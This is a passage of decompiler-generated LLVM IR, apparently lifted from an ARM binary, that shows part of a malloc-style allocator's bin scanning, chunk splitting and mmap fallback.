  %v0_11d58 = phi i32 [ %v7_11e80, %.dec_label_pc_11d58_crit_edge ], [ %v4_11c08, %dec_label_pc_11d58.loopexit ], [ %v3_11d50, %dec_label_pc_11d4c ]
  %v1_11d58 = or i32 %v0_11d58, 1
  store i32 %v1_11d58, i32* %r3.global-to-local, align 4
  %v2_11d5c = add i32 %v1_11d5c, 4
  %v3_11d5c = inttoptr i32 %v2_11d5c to i32*
  store i32 %v1_11d58, i32* %v3_11d5c, align 4
  br label %dec_label_pc_12320

dec_label_pc_11d64:                               ; preds = %dec_label_pc_11d34
  %v1_11d64 = load i32, i32* @sl, align 4
  %v2_11d64 = add i32 %v1_11d64, %v0_11d44
  store i32 %v2_11d64, i32* %r2.global-to-local, align 4
  %v1_11d68 = or i32 %v1_11d64, 1
  store i32 %v1_11d68, i32* %r3.global-to-local, align 4
  %v0_11d6c = load i32, i32* %lr.global-to-local, align 4
  %v1_11d6c = or i32 %v0_11d6c, 1
  store i32 %v1_11d6c, i32* %r1.global-to-local, align 4
  store i32 %v1_11d44, i32* %r4.global-to-local, align 4
  %v2_11d74 = add i32 %v0_11d44, 4
  %v3_11d74 = inttoptr i32 %v2_11d74 to i32*
  store i32 %v1_11d68, i32* %v3_11d74, align 4
  %v0_11d78 = load i32, i32* %r2.global-to-local, align 4
  %v1_11d78 = load i32, i32* @r6, align 4
  %v2_11d78 = add i32 %v1_11d78, 8
  %v3_11d78 = inttoptr i32 %v2_11d78 to i32*
  store i32 %v0_11d78, i32* %v3_11d78, align 4
  %v0_11d7c = load i32, i32* %r2.global-to-local, align 4
  %v1_11d7c = load i32, i32* @r6, align 4
  %v2_11d7c = add i32 %v1_11d7c, 12
  %v3_11d7c = inttoptr i32 %v2_11d7c to i32*
  store i32 %v0_11d7c, i32* %v3_11d7c, align 4
  %v0_11d80 = load i32, i32* %lr.global-to-local, align 4
  %v1_11d80 = load i32, i32* %r2.global-to-local, align 4
  %v3_11d80 = add i32 %v1_11d80, %v0_11d80
  %v4_11d80 = inttoptr i32 %v3_11d80 to i32*
  store i32 %v0_11d80, i32* %v4_11d80, align 4
  %v0_11d84 = load i32, i32* %r1.global-to-local, align 4
  %v1_11d84 = load i32, i32* %r2.global-to-local, align 4
  %v2_11d84 = add i32 %v1_11d84, 4
  %v3_11d84 = inttoptr i32 %v2_11d84 to i32*
  store i32 %v0_11d84, i32* %v3_11d84, align 4
  %v0_11d88 = load i32, i32* @r6, align 4
  %v1_11d88 = load i32, i32* %r2.global-to-local, align 4
  %v2_11d88 = add i32 %v1_11d88, 12
  %v3_11d88 = inttoptr i32 %v2_11d88 to i32*
  store i32 %v0_11d88, i32* %v3_11d88, align 4
  %v0_11d8c = load i32, i32* @r6, align 4
  %v1_11d8c = load i32, i32* %r2.global-to-local, align 4
  %v2_11d8c = add i32 %v1_11d8c, 8
  %v3_11d8c = inttoptr i32 %v2_11d8c to i32*
  store i32 %v0_11d8c, i32* %v3_11d8c, align 4
  br label %dec_label_pc_12320

dec_label_pc_11d98:                               ; preds = %dec_label_pc_11d00, %dec_label_pc_11cf0
  %v1_11d28 = phi i32 [ %storemerge.pre, %dec_label_pc_11cf0 ], [ %v3_11d0c, %dec_label_pc_11d00 ]
  store i32 %v1_11d28, i32* %ip.global-to-local, align 4
  %v9_11d98 = icmp eq i32 %v1_11d28, %v1_11cf4
  br i1 %v9_11d98, label %dec_label_pc_11da0.loopexit, label %dec_label_pc_11d00

dec_label_pc_11da0.loopexit:                      ; preds = %dec_label_pc_11d98
  br label %dec_label_pc_11da0

dec_label_pc_11da0:                               ; preds = %dec_label_pc_11ce8.dec_label_pc_11da0_crit_edge, %dec_label_pc_11da0.loopexit
  %v4_11dd0.pre-phi = phi i32 [ %.pre200, %dec_label_pc_11ce8.dec_label_pc_11da0_crit_edge ], [ %v4_11cf0, %dec_label_pc_11da0.loopexit ]
  %v1_11da0 = add i32 %v0_11da0.pre, 1
  store i32 %v1_11da0, i32* %r2.global-to-local, align 4
  %v1_11da4 = urem i32 %v1_11da0, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %r0.global-to-local, align 4
  %v6_11db0 = shl i32 1, %v1_11da4
  store i32 %v6_11db0, i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_11db8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 64) to i32*), align 4
  store i32 %v4_11db8, i32* %r3.global-to-local, align 4
  %v3_11dbc = udiv i32 %v1_11da0, 32
  store i32 %v3_11dbc, i32* @r5, align 4
  %v4_11dc0 = mul nuw nsw i32 %v3_11dbc, 4
  %v5_11dc0 = add i32 %v4_11db8, %v4_11dc0
  store i32 %v5_11dc0, i32* %r2.global-to-local, align 4
  %v1_11dc4 = add i32 %v5_11dc0, 820
  %v2_11dc4 = inttoptr i32 %v1_11dc4 to i32*
  %v3_11dc4 = load i32, i32* %v2_11dc4, align 4
  store i32 %v3_11dc4, i32* @r4, align 4
  %v1_11dc8 = add i32 %v4_11db8, 52
  store i32 %v1_11dc8, i32* %r3.global-to-local, align 4
  store i32 64, i32* @r8, align 4
  %v5_11dd0 = add i32 %v1_11dc8, %v4_11dd0.pre-phi
  store i32 %v5_11dd0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11dd4

dec_label_pc_11dd4:                               ; preds = %dec_label_pc_11e3c, %dec_label_pc_11da0
  %v1_11ddc = phi i32 [ %v1_11ddc.pre, %dec_label_pc_11e3c ], [ %v3_11dc4, %dec_label_pc_11da0 ]
  %v0_11ddc = phi i32 [ %v0_11dd4.pre, %dec_label_pc_11e3c ], [ %v6_11db0, %dec_label_pc_11da0 ]
  %v1_11dd4 = sub i32 1, %v0_11ddc
  %v2_11dd4 = icmp ult i32 %v0_11ddc, 2
  %v1_11dd4. = select i1 %v2_11dd4, i32 %v1_11dd4, i32 0
  store i32 %v1_11dd4., i32* %r3.global-to-local, align 4
  %tmp141 = icmp ugt i32 %v0_11ddc, %v1_11ddc
  br i1 %tmp141, label %.thread12, label %bb142

.thread12:                                        ; preds = %dec_label_pc_11dd4
  %v5_11de0 = or i32 %v1_11dd4., 1
  store i32 %v5_11de0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11dec.preheader

bb142:                                            ; preds = %dec_label_pc_11dd4
  %v2_11de4 = icmp eq i32 %v1_11dd4., 0
  br i1 %v2_11de4, label %.dec_label_pc_11e28.preheader_crit_edge, label %dec_label_pc_11dec.preheader

.dec_label_pc_11e28.preheader_crit_edge:          ; preds = %bb142
  %v0_11e2054.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11e28.preheader

dec_label_pc_11dec.preheader:                     ; preds = %bb142, %.thread12
  %v0_11dec.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11dec

dec_label_pc_11dec:                               ; preds = %dec_label_pc_11dec.preheader, %dec_label_pc_11df8
  %v0_11dec = phi i32 [ %v0_11dec.pre, %dec_label_pc_11dec.preheader ], [ %v1_11dec, %dec_label_pc_11df8 ]
  %v1_11dec = add i32 %v0_11dec, 1
  store i32 %v1_11dec, i32* @r5, align 4
  %tmp208 = icmp ugt i32 %v1_11dec, 2
  br i1 %tmp208, label %dec_label_pc_11ecc.loopexit, label %dec_label_pc_11df8

dec_label_pc_11df8:                               ; preds = %dec_label_pc_11dec
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %r3.global-to-local, align 4
  %v1_11dfc = load i32, i32* @r8, align 4
  %v2_11dfc = add i32 %v1_11dfc, ptrtoint (i32* @global_var_21694.308 to i32)
  %v3_11dfc = inttoptr i32 %v2_11dfc to i32*
  %v4_11dfc = load i32, i32* %v3_11dfc, align 4
  store i32 %v4_11dfc, i32* %r2.global-to-local, align 4
  %v4_11e00 = mul i32 %v1_11dec, 4
  %v5_11e00 = add i32 %v4_11dfc, %v4_11e00
  store i32 %v5_11e00, i32* %r3.global-to-local, align 4
  %v1_11e04 = add i32 %v5_11e00, 820
  %v2_11e04 = inttoptr i32 %v1_11e04 to i32*
  %v3_11e04 = load i32, i32* %v2_11e04, align 4
  store i32 %v3_11e04, i32* @r4, align 4
  %v2_11e08 = icmp eq i32 %v3_11e04, 0
  br i1 %v2_11e08, label %dec_label_pc_11dec, label %dec_label_pc_11e10

dec_label_pc_11e10:                               ; preds = %dec_label_pc_11df8
  %v4_11e10 = mul i32 %v1_11dec, 256
  %v5_11e10 = add i32 %v4_11dfc, %v4_11e10
  store i32 %v5_11e10, i32* %r3.global-to-local, align 4
  %v1_11e14 = add i32 %v5_11e10, 44
  store i32 %v1_11e14, i32* %r0.global-to-local, align 4
  %v0_11e18 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_11e18, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11e28.preheader

dec_label_pc_11e28.preheader:                     ; preds = %.dec_label_pc_11e28.preheader_crit_edge, %dec_label_pc_11e10
  %v0_11e2054 = phi i32 [ %v1_11e14, %dec_label_pc_11e10 ], [ %v0_11e2054.pre, %.dec_label_pc_11e28.preheader_crit_edge ]
  %v0_11e44 = phi i32 [ %v3_11e04, %dec_label_pc_11e10 ], [ %v1_11ddc, %.dec_label_pc_11e28.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_11e18, %dec_label_pc_11e10 ], [ %v0_11ddc, %.dec_label_pc_11e28.preheader_crit_edge ]
  %v2_11e2851 = and i32 %ip.promoted, %v0_11e44
  %v4_11e2853 = icmp eq i32 %v2_11e2851, 0
  br i1 %v4_11e2853, label %dec_label_pc_11e20, label %dec_label_pc_11e30

dec_label_pc_11e20:                               ; preds = %dec_label_pc_11e28.preheader, %dec_label_pc_11e20
  %v2_11e2456 = phi i32 [ %v2_11e24, %dec_label_pc_11e20 ], [ %ip.promoted, %dec_label_pc_11e28.preheader ]
  %v0_11e2055 = phi i32 [ %v1_11e20, %dec_label_pc_11e20 ], [ %v0_11e2054, %dec_label_pc_11e28.preheader ]
  %v1_11e20 = add i32 %v0_11e2055, 8
  %v2_11e24 = mul i32 %v2_11e2456, 2
  %v2_11e28 = and i32 %v2_11e24, %v0_11e44
  %v4_11e28 = icmp eq i32 %v2_11e28, 0
  br i1 %v4_11e28, label %dec_label_pc_11e20, label %dec_label_pc_11e28.dec_label_pc_11e30_crit_edge

dec_label_pc_11e28.dec_label_pc_11e30_crit_edge:  ; preds = %dec_label_pc_11e20
  store i32 %v1_11e20, i32* %r0.global-to-local, align 4
  store i32 %v2_11e24, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11e30

dec_label_pc_11e30:                               ; preds = %dec_label_pc_11e28.dec_label_pc_11e30_crit_edge, %dec_label_pc_11e28.preheader
  %v0_11e50 = phi i32 [ %v2_11e24, %dec_label_pc_11e28.dec_label_pc_11e30_crit_edge ], [ %ip.promoted, %dec_label_pc_11e28.preheader ]
  %v0_11e74 = phi i32 [ %v1_11e20, %dec_label_pc_11e28.dec_label_pc_11e30_crit_edge ], [ %v0_11e2054, %dec_label_pc_11e28.preheader ]
  %v1_11e30 = add i32 %v0_11e74, 12
  %v2_11e30 = inttoptr i32 %v1_11e30 to i32*
  %v3_11e30 = load i32, i32* %v2_11e30, align 4
  store i32 %v3_11e30, i32* @lr, align 4
  %v9_11e34 = icmp eq i32 %v3_11e30, %v0_11e74
  br i1 %v9_11e34, label %dec_label_pc_11e3c, label %dec_label_pc_11e5c

dec_label_pc_11e3c:                               ; preds = %dec_label_pc_11e30
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %r0.global-to-local, align 4
  %v1_11e40 = load i32, i32* @r8, align 4
  %v2_11e40 = add i32 %v1_11e40, ptrtoint (i32* @global_var_21694.308 to i32)
  %v3_11e40 = inttoptr i32 %v2_11e40 to i32*
  %v4_11e40 = load i32, i32* %v3_11e40, align 4
  %v2_11e44 = sub i32 -1, %v0_11e50
  %v3_11e44 = and i32 %v0_11e44, %v2_11e44
  store i32 %v3_11e44, i32* @r4, align 4
  %v1_11e48 = load i32, i32* @r5, align 4
  %v4_11e48 = mul i32 %v1_11e48, 4
  %v5_11e48 = add i32 %v4_11e48, %v4_11e40
  store i32 %v5_11e48, i32* %r3.global-to-local, align 4
  %v1_11e4c = add i32 %v0_11e74, 8
  store i32 %v1_11e4c, i32* %r0.global-to-local, align 4
  %v2_11e50 = mul i32 %v0_11e50, 2
  store i32 %v2_11e50, i32* %ip.global-to-local, align 4
  %v2_11e54 = add i32 %v5_11e48, 820
  %v3_11e54 = inttoptr i32 %v2_11e54 to i32*
  store i32 %v3_11e44, i32* %v3_11e54, align 4
  %v0_11dd4.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_11ddc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11dd4

dec_label_pc_11e5c:                               ; preds = %dec_label_pc_11e30
  %v1_11e5c = add i32 %v3_11e30, 4
  %v2_11e5c = inttoptr i32 %v1_11e5c to i32*
  %v3_11e5c = load i32, i32* %v2_11e5c, align 4
  store i32 %v3_11e5c, i32* %r3.global-to-local, align 4
  %v1_11e60 = and i32 %v3_11e5c, -4
  store i32 %v1_11e60, i32* %r2.global-to-local, align 4
  %v0_11e64 = load i32, i32* @sl, align 4
  %v2_11e64 = sub i32 %v1_11e60, %v0_11e64
  store i32 %v2_11e64, i32* %ip.global-to-local, align 4
  %v1_11e68 = add i32 %v3_11e30, 12
  %v2_11e68 = inttoptr i32 %v1_11e68 to i32*
  %v3_11e68 = load i32, i32* %v2_11e68, align 4
  store i32 %v3_11e68, i32* %r3.global-to-local, align 4
  %tmp209 = icmp ult i32 %v2_11e64, 16
  br i1 %tmp209, label %bb143, label %bb144

bb143:                                            ; preds = %dec_label_pc_11e5c
  %v6_11e70 = add i32 %v1_11e60, %v3_11e30
  store i32 %v6_11e70, i32* %r2.global-to-local, align 4
  br label %bb144

bb144:                                            ; preds = %dec_label_pc_11e5c, %bb143
  %v2_11e74 = add i32 %v3_11e68, 8
  %v3_11e74 = inttoptr i32 %v2_11e74 to i32*
  store i32 %v0_11e74, i32* %v3_11e74, align 4
  %v0_11e78 = load i32, i32* %r3.global-to-local, align 4
  %v1_11e78 = load i32, i32* %r0.global-to-local, align 4
  %v2_11e78 = add i32 %v1_11e78, 12
  %v3_11e78 = inttoptr i32 %v2_11e78 to i32*
  store i32 %v0_11e78, i32* %v3_11e78, align 4
  %v4_11e7c = load i32, i32* @lr, align 4
  br i1 %tmp209, label %.dec_label_pc_11d58_crit_edge, label %dec_label_pc_11e88

.dec_label_pc_11d58_crit_edge:                    ; preds = %bb144
  %v5_11e7c = add i32 %v4_11e7c, 8
  store i32 %v5_11e7c, i32* %r4.global-to-local, align 4
  %v4_11e80 = load i32, i32* %r2.global-to-local, align 4
  %v5_11e80 = add i32 %v4_11e80, 4
  %v6_11e80 = inttoptr i32 %v5_11e80 to i32*
  %v7_11e80 = load i32, i32* %v6_11e80, align 4
  store i32 %v7_11e80, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11d58

dec_label_pc_11e88:                               ; preds = %bb144
  %v1_11e88 = load i32, i32* @sl, align 4
  %v2_11e88 = add i32 %v1_11e88, %v4_11e7c
  store i32 %v2_11e88, i32* %r1.global-to-local, align 4
  %v1_11e90 = load i32, i32* @r6, align 4
  %v2_11e90 = add i32 %v1_11e90, 8
  %v3_11e90 = inttoptr i32 %v2_11e90 to i32*
  store i32 %v2_11e88, i32* %v3_11e90, align 4
  %v0_11e94 = load i32, i32* %r1.global-to-local, align 4
  %v1_11e94 = load i32, i32* @r6, align 4
  %v2_11e94 = add i32 %v1_11e94, 12
  %v3_11e94 = inttoptr i32 %v2_11e94 to i32*
  store i32 %v0_11e94, i32* %v3_11e94, align 4
  %v0_11e98 = load i32, i32* @r6, align 4
  %v1_11e98 = load i32, i32* %r1.global-to-local, align 4
  %v2_11e98 = add i32 %v1_11e98, 8
  %v3_11e98 = inttoptr i32 %v2_11e98 to i32*
  store i32 %v0_11e98, i32* %v3_11e98, align 4
  %v0_11e9c = load i32, i32* @r6, align 4
  %v1_11e9c = load i32, i32* %r1.global-to-local, align 4
  %v2_11e9c = add i32 %v1_11e9c, 12
  %v3_11e9c = inttoptr i32 %v2_11e9c to i32*
  store i32 %v0_11e9c, i32* %v3_11e9c, align 4
  %tmp210 = icmp ult i32 %v1_11e88, 256
  br i1 %tmp210, label %bb145, label %.thread121

bb145:                                            ; preds = %dec_label_pc_11e88
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %r2.global-to-local, align 4
  %v8_11ea8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 64) to i32*), align 4
  store i32 %v8_11ea8, i32* %r3.global-to-local, align 4
  %v4_11eac = load i32, i32* %r1.global-to-local, align 4
  %v6_11eac = add i32 %v8_11ea8, 48
  %v7_11eac = inttoptr i32 %v6_11eac to i32*
  store i32 %v4_11eac, i32* %v7_11eac, align 4
  br label %.thread121

.thread121:                                       ; preds = %dec_label_pc_11e88, %bb145
  %v0_11eb0 = load i32, i32* @sl, align 4
  %v1_11eb0 = or i32 %v0_11eb0, 1
  store i32 %v1_11eb0, i32* %r2.global-to-local, align 4
  %v0_11eb4 = load i32, i32* %ip.global-to-local, align 4
  %v1_11eb4 = or i32 %v0_11eb4, 1
  store i32 %v1_11eb4, i32* %r3.global-to-local, align 4
  %v0_11eb8 = load i32, i32* @lr, align 4
  %v1_11eb8 = add i32 %v0_11eb8, 8
  store i32 %v1_11eb8, i32* %r4.global-to-local, align 4
  %v2_11ebc = add i32 %v0_11eb8, 4
  %v3_11ebc = inttoptr i32 %v2_11ebc to i32*
  store i32 %v1_11eb0, i32* %v3_11ebc, align 4
  %v0_11ec0 = load i32, i32* %ip.global-to-local, align 4
  %v1_11ec0 = load i32, i32* %r1.global-to-local, align 4
  %v3_11ec0 = add i32 %v1_11ec0, %v0_11ec0
  %v4_11ec0 = inttoptr i32 %v3_11ec0 to i32*
  store i32 %v0_11ec0, i32* %v4_11ec0, align 4
  %v0_11ec4 = load i32, i32* %r3.global-to-local, align 4
  %v1_11ec4 = load i32, i32* %r1.global-to-local, align 4
  %v2_11ec4 = add i32 %v1_11ec4, 4
  %v3_11ec4 = inttoptr i32 %v2_11ec4 to i32*
  store i32 %v0_11ec4, i32* %v3_11ec4, align 4
  br label %dec_label_pc_12320

dec_label_pc_11ecc.loopexit:                      ; preds = %dec_label_pc_11dec
  br label %dec_label_pc_11ecc

dec_label_pc_11ecc:                               ; preds = %dec_label_pc_11ecc.loopexit, %dec_label_pc_11ae0, %dec_label_pc_11ae8
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %ip.global-to-local, align 4
  %v4_11ed4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 64) to i32*), align 4
  store i32 %v4_11ed4, i32* @r0, align 4
  %v1_11ed8 = add i32 %v4_11ed4, 44
  %v2_11ed8 = inttoptr i32 %v1_11ed8 to i32*
  %v3_11ed8 = load i32, i32* %v2_11ed8, align 4
  store i32 %v3_11ed8, i32* %ip.global-to-local, align 4
  %v1_11edc = add i32 %v3_11ed8, 4
  %v2_11edc = inttoptr i32 %v1_11edc to i32*
  %v3_11edc = load i32, i32* %v2_11edc, align 4
  %v0_11ee0 = load i32, i32* @sl, align 4
  %v1_11ee0 = add i32 %v0_11ee0, 16
  store i32 %v1_11ee0, i32* %r1.global-to-local, align 4
  %v1_11ee4 = and i32 %v3_11edc, -4
  store i32 %v1_11ee4, i32* %r3.global-to-local, align 4
  %v3_11ee8 = icmp ult i32 %v1_11ee4, %v1_11ee0
  br i1 %v3_11ee8, label %dec_label_pc_11f18, label %dec_label_pc_11ef4

dec_label_pc_11ef4:                               ; preds = %dec_label_pc_11ecc
  %v2_11ef4 = sub i32 %v1_11ee4, %v0_11ee0
  %v2_11ef8 = add i32 %v0_11ee0, %v3_11ed8
  store i32 %v2_11ef8, i32* %r1.global-to-local, align 4
  %v1_11efc = or i32 %v2_11ef4, 1
  store i32 %v1_11efc, i32* %r3.global-to-local, align 4
  %v1_11f00 = or i32 %v0_11ee0, 1
  store i32 %v1_11f00, i32* %r2.global-to-local, align 4
  %v1_11f04 = add i32 %v3_11ed8, 8
  store i32 %v1_11f04, i32* %r4.global-to-local, align 4
  store i32 %v1_11f00, i32* %v2_11edc, align 4
  %v0_11f0c = load i32, i32* %r1.global-to-local, align 4
  %v1_11f0c = load i32, i32* @r0, align 4
  %v2_11f0c = add i32 %v1_11f0c, 44
  %v3_11f0c = inttoptr i32 %v2_11f0c to i32*
  store i32 %v0_11f0c, i32* %v3_11f0c, align 4
  %v0_11f10 = load i32, i32* %r3.global-to-local, align 4
  %v1_11f10 = load i32, i32* %r1.global-to-local, align 4
  %v2_11f10 = add i32 %v1_11f10, 4
  %v3_11f10 = inttoptr i32 %v2_11f10 to i32*
  store i32 %v0_11f10, i32* %v3_11f10, align 4
  br label %dec_label_pc_12320

dec_label_pc_11f18:                               ; preds = %dec_label_pc_11ecc
  %v1_11f18 = inttoptr i32 %v4_11ed4 to i32*
  %v2_11f18 = load i32, i32* %v1_11f18, align 4
  store i32 %v2_11f18, i32* %r3.global-to-local, align 4
  %v1_11f1c = and i32 %v2_11f18, 2
  store i32 %v1_11f1c, i32* %ip.global-to-local, align 4
  %v2_11f1c = icmp eq i32 %v1_11f1c, 0
  %v1_11f20 = add i32 %v4_11ed4, 860
  %v2_11f20 = inttoptr i32 %v1_11f20 to i32*
  %v3_11f20 = load i32, i32* %v2_11f20, align 4
  store i32 %v3_11f20, i32* %r1.global-to-local, align 4
  br i1 %v2_11f1c, label %dec_label_pc_11f38, label %dec_label_pc_11f28

dec_label_pc_11f28:                               ; preds = %dec_label_pc_11f18
  %v0_11f28 = call i32 @__malloc_consolidate()
  %v0_11f2c = load i32, i32* @sl, align 4
  %v1_11f2c = add i32 %v0_11f2c, -7
  store i32 %v1_11f2c, i32* %r0.global-to-local, align 4
  %v1_11f30 = call i32 @malloc(i32 %v1_11f2c)
  store i32 %v1_11f30, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1231c

dec_label_pc_11f38:                               ; preds = %dec_label_pc_11f18
  %v1_11f38 = add i32 %v4_11ed4, 844
  %v2_11f38 = inttoptr i32 %v1_11f38 to i32*
  %v3_11f38 = load i32, i32* %v2_11f38, align 4
  store i32 %v3_11f38, i32* %r3.global-to-local, align 4
  %v3_11f3c = icmp ult i32 %v0_11ee0, %v3_11f38
  %v1_11f40 = add i32 %v3_11f20, -1
  store i32 %v1_11f40, i32* %sb.global-to-local, align 4
  br i1 %v3_11f3c, label %dec_label_pc_12014, label %dec_label_pc_11f48

dec_label_pc_11f48:                               ; preds = %dec_label_pc_11f38
  %v1_11f48 = add i32 %v4_11ed4, 852
  %v2_11f48 = inttoptr i32 %v1_11f48 to i32*
  %v3_11f48 = load i32, i32* %v2_11f48, align 4
  store i32 %v3_11f48, i32* %r2.global-to-local, align 4
  %v1_11f4c = add i32 %v4_11ed4, 848
  %v2_11f4c = inttoptr i32 %v1_11f4c to i32*
  %v3_11f4c = load i32, i32* %v2_11f4c, align 4
  store i32 %v3_11f4c, i32* %r3.global-to-local, align 4
  %v6_11f54 = icmp slt i32 %v3_11f4c, %v3_11f48
  br i1 %v6_11f54, label %dec_label_pc_11f58, label %dec_label_pc_12014

dec_label_pc_11f58:                               ; preds = %dec_label_pc_11f48
  %v1_11f58 = add i32 %v0_11ee0, 10
  %v2_11f5c = add i32 %v1_11f58, %v3_11f20
  store i32 %v2_11f5c, i32* %r3.global-to-local, align 4
  %v2_11f60 = sub i32 0, %v3_11f20
  %v3_11f60 = and i32 %v2_11f5c, %v2_11f60
  store i32 %v3_11f60, i32* @r4, align 4
  %tmp211 = icmp ugt i32 %v3_11f60, %v0_11ee0
  br i1 %tmp211, label %dec_label_pc_11f6c, label %dec_label_pc_12014

dec_label_pc_11f6c:                               ; preds = %dec_label_pc_11f58
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_11f60, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_11f84 = call i32 @mmap(i32 0, i32 %v3_11f60, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_11f84, i32* %r0.global-to-local, align 4
  %v7_11f88 = icmp eq i32 %v6_11f84, -1
  br i1 %v7_11f88, label %dec_label_pc_11f6c.dec_label_pc_12014_crit_edge, label %dec_label_pc_11f90

dec_label_pc_11f6c.dec_label_pc_12014_crit_edge:  ; preds = %dec_label_pc_11f6c
  %v1_12038.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_12014

dec_label_pc_11f90:                               ; preds = %dec_label_pc_11f6c
  %v1_11f90 = urem i32 %v6_11f84, 8
  store i32 %v1_11f90, i32* %r2.global-to-local, align 4
  %v2_11f90 = icmp eq i32 %v1_11f90, 0
  br i1 %v2_11f90, label %bb146, label %.thread25

.thread25:                                        ; preds = %dec_label_pc_11f90
  %v2_11f94 = sub nsw i32 8, %v1_11f90
  store i32 %v2_11f94, i32* %r3.global-to-local, align 4
  %v2_11f98 = load i32, i32* @r4, align 4
  %v3_11f98 = sub i32 %v2_11f98, %v2_11f94
  %v3_11f9c = add i32 %v2_11f94, %v6_11f84
  store i32 %v3_11f9c, i32* %lr.global-to-local, align 4
  %v2_11fa4 = or i32 %v3_11f98, 2
  store i32 %v2_11fa4, i32* %r2.global-to-local, align 4
  %v5_11fac = inttoptr i32 %v3_11f9c to i32*
  store i32 %v2_11f94, i32* %v5_11fac, align 4
  %v1_11fb0 = load i32, i32* %r2.global-to-local, align 4
  %v2_11fb0 = load i32, i32* %lr.global-to-local, align 4
  %v3_11fb0 = add i32 %v2_11fb0, 4
  %v4_11fb0 = inttoptr i32 %v3_11fb0 to i32*
  store i32 %v1_11fb0, i32* %v4_11fb0, align 4
  br label %.thread27

bb146:                                            ; preds = %dec_label_pc_11f90
  store i32 %v6_11f84, i32* %lr.global-to-local, align 4
  %v1_11fa847 = load i32, i32* @r4, align 4
  %v2_11fa848 = or i32 %v1_11fa847, 2
  store i32 %v2_11fa848, i32* %r3.global-to-local, align 4
  %v3_11fb4 = inttoptr i32 %v6_11f84 to i32*
  store i32 0, i32* %v3_11fb4, align 4
  %v1_11fb8 = load i32, i32* %r3.global-to-local, align 4
  %v2_11fb8 = load i32, i32* %lr.global-to-local, align 4
  %v3_11fb8 = add i32 %v2_11fb8, 4
  %v4_11fb8 = inttoptr i32 %v3_11fb8 to i32*
  store i32 %v1_11fb8, i32* %v4_11fb8, align 4
  br label %.thread27

.thread27:                                        ; preds = %.thread25, %bb146
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_11fc4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 64) to i32*), align 4
  store i32 %v4_11fc4, i32* %ip.global-to-local, align 4
  %v1_11fc8 = add i32 %v4_11fc4, 848
  %v2_11fc8 = inttoptr i32 %v1_11fc8 to i32*
  %v3_11fc8 = load i32, i32* %v2_11fc8, align 4
  store i32 %v3_11fc8, i32* %r3.global-to-local, align 4
  %v1_11fcc = add i32 %v4_11fc4, 856
  %v2_11fcc = inttoptr i32 %v1_11fcc to i32*
  %v3_11fcc = load i32, i32* %v2_11fcc, align 4
  store i32 %v3_11fcc, i32* %r2.global-to-local, align 4
  %v1_11fd0 = add i32 %v3_11fc8, 1
  store i32 %v1_11fd0, i32* %r3.global-to-local, align 4
  %v7_11fd8 = icmp sgt i32 %v1_11fd0, %v3_11fcc
  br i1 %v7_11fd8, label %bb147, label %bb148

bb147:                                            ; preds = %.thread27
  store i32 %v1_11fd0, i32* %v2_11fcc, align 4
  %v0_11fdc.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_11fdc.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb148

bb148:                                            ; preds = %.thread27, %bb147
  %v1_11fdc = phi i32 [ %v4_11fc4, %.thread27 ], [ %v1_11fdc.pre, %bb147 ]
  %v0_11fdc = phi i32 [ %v1_11fd0, %.thread27 ], [ %v0_11fdc.pre, %bb147 ]
  %v2_11fdc = add i32 %v1_11fdc, 848
  %v3_11fdc = inttoptr i32 %v2_11fdc to i32*
  store i32 %v0_11fdc, i32* %v3_11fdc, align 4
  %v0_11fe0 = load i32, i32* %ip.global-to-local, align 4
  %v1_11fe0 = add i32 %v0_11fe0, 868
  %v2_11fe0 = inttoptr i32 %v1_11fe0 to i32*
  %v3_11fe0 = load i32, i32* %v2_11fe0, align 4
  store i32 %v3_11fe0, i32* %r3.global-to-local, align 4
  %v1_11fe4 = add i32 %v0_11fe0, 880
  %v2_11fe4 = inttoptr i32 %v1_11fe4 to i32*
  %v3_11fe4 = load i32, i32* %v2_11fe4, align 4
  store i32 %v3_11fe4, i32* %r2.global-to-local, align 4
  %v0_11fe8 = load i32, i32* @r4, align 4
  %v2_11fe8 = add i32 %v0_11fe8, %v3_11fe0
  store i32 %v2_11fe8, i32* %r1.global-to-local, align 4
  %v1_11fec = add i32 %v0_11fe0, 872
  %v2_11fec = inttoptr i32 %v1_11fec to i32*
  %v3_11fec = load i32, i32* %v2_11fec, align 4
  store i32 %v3_11fec, i32* %r3.global-to-local, align 4
  %v1_11ff4 = add i32 %v0_11fe0, 884
  %v2_11ff4 = inttoptr i32 %v1_11ff4 to i32*
  %v3_11ff4 = load i32, i32* %v2_11ff4, align 4
